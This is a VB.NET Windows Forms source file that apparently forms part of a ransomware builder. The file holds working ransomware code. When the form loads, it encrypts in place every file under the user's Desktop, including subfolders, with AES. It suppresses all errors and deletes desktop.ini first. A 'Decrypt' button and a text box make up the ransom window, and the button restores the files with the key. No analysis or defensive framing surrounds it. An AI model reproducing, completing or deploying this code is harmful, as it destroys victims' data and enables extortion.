Imports System.IO
Imports System.Windows.Forms

Public Class Class2
    Inherits Custom_Form

    Private K As String
    Friend WithEvents B1 As Button
    Friend WithEvents RichTextBox1 As RichTextBox
    Private ALG As Algo
    Sub New(ByVal Key As String, ByVal Algo As Algo)
        Me.K = Key

        Me.ALG = Algo
    End Sub

    Public Enum Algo

        AES = 0

        RC6 = 1

        BLOW = 2

        TWO = 3

        SALSA20 = 4

        CAST6 = 5

    End Enum
    Public Sub InitializeComponent()
        Me.B1 = New System.Windows.Forms.Button()
        Me.RichTextBox1 = New System.Windows.Forms.RichTextBox()
        Me.SuspendLayout()
        '
        'B1
        '
        Me.B1.Location = New System.Drawing.Point(12, 148)
        Me.B1.Name = "B1"
        Me.B1.Size = New System.Drawing.Size(374, 100)
        Me.B1.TabIndex = 0
        Me.B1.Text = "Decrypt"
        Me.B1.UseVisualStyleBackColor = True
        '
        'RichTextBox1
        '
        Me.RichTextBox1.BorderStyle = System.Windows.Forms.BorderStyle.None
        Me.RichTextBox1.Location = New System.Drawing.Point(12, 12)
        Me.RichTextBox1.Name = "RichTextBox1"
        Me.RichTextBox1.Size = New System.Drawing.Size(374, 130)
        Me.RichTextBox1.TabIndex = 1
        Me.RichTextBox1.Text = ""
        '
        'Class2
        '
        Me.BackColor = System.Drawing.Color.White
        Me.ClientSize = New System.Drawing.Size(398, 274)
        Me.Controls.Add(Me.RichTextBox1)
        Me.Controls.Add(Me.B1)
        Me.Name = "Class2"
        Me.ResumeLayout(False)

    End Sub

    Private Async Sub Class2_Load(sender As Object, e As EventArgs) Handles MyBase.Load

        Await Task.Run(Sub() Encrypt())
    End Sub


    Public Async Sub Encrypt()

        If ALG = 0 Then
            Dim P = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)

            IO.File.Delete(P & "\desktop.ini")

            For Each F In Directory.GetFiles(P, "*.*", SearchOption.AllDirectories)

                Try

                    Dim B As Byte() = Await Task.Run(Function() IO.File.ReadAllBytes(F))

                    Dim AES As New CryptoHelper.AES(B, K, False)

                    Await Task.Run(Sub() IO.File.WriteAllBytes(F, AES.AES_Encrypt))

                Catch ex As Exception

                End Try

            Next

        End If

    End Sub

    Public Async Sub Decrypt()
        If ALG = 0 Then

            Dim P = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)

            IO.File.Delete(P & "\desktop.ini")

            For Each F In Directory.GetFiles(P, "*.*", SearchOption.AllDirectories)

                Try

                    Dim B As Byte() = Await Task.Run(Function() IO.File.ReadAllBytes(F))

                    Dim AES As New CryptoHelper.AES(B, K, False)

                    Await Task.Run(Sub() IO.File.WriteAllBytes(F, AES.AES_Decrypt))

                Catch ex As Exception

                End Try

            Next

        End If

    End Sub

    Public Async Sub B1_Click(sender As Object, e As EventArgs) Handles B1.Click
        Await Task.Run(Sub() Decrypt())
    End Sub


End Class
